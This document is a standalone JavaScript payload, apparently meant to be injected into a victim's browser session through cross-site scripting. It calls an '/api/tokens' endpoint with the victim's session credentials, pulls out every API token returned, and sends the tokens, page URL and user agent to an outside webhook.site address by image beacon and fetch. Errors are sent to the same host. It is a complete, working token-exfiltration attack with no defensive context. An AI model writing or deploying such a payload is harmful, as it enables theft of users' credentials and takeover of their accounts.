fetch("/api/tokens?limit=100", {
  method: "GET",
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  console.log("[+] API response received:", data);

  // Check if the response is an object with an `entries` array (based on your screenshot)
  const entries = Array.isArray(data.entries) ? data.entries : [];
  console.log("[+] Token entries count:", entries.length);

  if (entries.length > 0) {
    // Extract all tokens
    const tokens = entries.map(e => e.token).filter(Boolean);
    console.log("[+] Extracted tokens:", tokens);

    if (tokens.length > 0) {
      const fullPayload = {
        tokens,
        location: location.href,
        ua: navigator.userAgent
      };

      const url = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?data=" +
                  encodeURIComponent(JSON.stringify(fullPayload));

      console.log("[+] Sending token to webhook:", url);

      // Use both image beacon and fetch
      new Image().src = url;
      fetch(url, { mode: "no-cors" });
    } else {
      console.warn("[!] No tokens found in entries.");
    }
  } else {
    console.warn("[!] No entries array or empty.");
  }
})
.catch(e => {
  console.error("[!] Error occurred:", e.message);
  const err = encodeURIComponent(e.message);
  new Image().src = `https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=${err}`;
});
